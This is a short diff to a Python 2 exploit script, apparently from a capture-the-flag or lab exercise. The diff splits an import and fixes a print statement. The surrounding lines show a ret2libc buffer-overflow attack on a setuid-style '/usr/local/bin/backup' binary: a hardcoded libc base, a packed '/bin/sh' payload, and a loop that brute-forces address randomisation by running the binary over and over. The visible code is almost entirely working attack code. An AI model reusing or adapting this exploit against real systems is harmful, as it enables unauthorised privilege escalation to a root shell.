@@ -1,4 +1,5 @@
-import struct, subprocess
+import struct
+import subprocess
 
 libc = 0xf75e2000 #ldd /usr/local/bin/backup | grep libc.so.6
 
@@ -23,5 +24,5 @@ payload += struct.pack("<I", binsh)
 attempts = 0
 while True:
 	attempts += 1
-	print "Attempts: " + attempts
+	print "Attempts: " + str(attempts)
 	subprocess.call(["/usr/local/bin/backup", "-i",  "3de811f4ab2b7543eaf45df611c2dd2541a5fc5af601772638b81dce6852d110", payload])
